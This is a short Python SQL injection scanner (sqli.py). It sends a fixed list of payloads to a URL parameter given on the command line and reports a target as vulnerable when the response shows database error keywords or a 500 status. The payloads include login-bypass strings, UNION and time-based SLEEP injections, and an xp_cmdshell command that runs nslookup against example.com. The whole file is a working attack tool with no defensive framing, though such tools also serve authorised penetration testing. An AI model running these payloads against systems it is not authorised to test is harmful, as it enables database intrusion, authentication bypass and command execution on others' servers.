import requests
import sys

payloads = [
    "' OR '1'='1",
    "' OR '1'='1' -- ",
    "' OR 1=1 -- ",
    "' OR '1'='1' /*",
    "admin' --",
    "admin' #",
    "admin'/*",
    "' UNION SELECT null, null, null -- ",
    "1' AND 1=1 -- ",
    "1' AND 1=2 -- ",
    "' AND SLEEP(5) --",
    "' OR IF(1=1, SLEEP(5), 0); --",
    "1; EXEC xp_cmdshell('nslookup example.com'); --"
]

def test_sqli(url, param, payload, method="GET"):
    params = {param: payload}
    try:
        if method == "GET":
            response = requests.get(url, params=params, timeout=10)
        elif method == "POST":
            response = requests.post(url, data=params, timeout=10)

        if any(indicator in response.text.lower() for indicator in ["syntax error", "mysql", "sql", "warning", "error"]) or response.status_code == 500:
            return True, response.text
        else:
            return False, response.text
    except requests.exceptions.RequestException as e:
        return False, str(e)

def scan_url_for_sqli(url, param, method="GET"):
    for payload in payloads:
        is_vulnerable, response = test_sqli(url, param, payload, method)
        if is_vulnerable:
            print(f"[+] Vulnerable Payload Found: {payload}")
            print(f"Response: {response[:500]}")  # Print only the first 500 chars for brevity
        else:
            print(f"[-] Not Vulnerable with Payload: {payload}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python sqli.py <url> <parameter> <method>")
    else:
        target_url = sys.argv[1]
        parameter = sys.argv[2]
        request_method = sys.argv[3].upper()
        if request_method not in ["GET", "POST"]:
            print("Invalid request method. Please enter GET or POST.")
        else:
            scan_url_for_sqli(target_url, parameter, request_method)
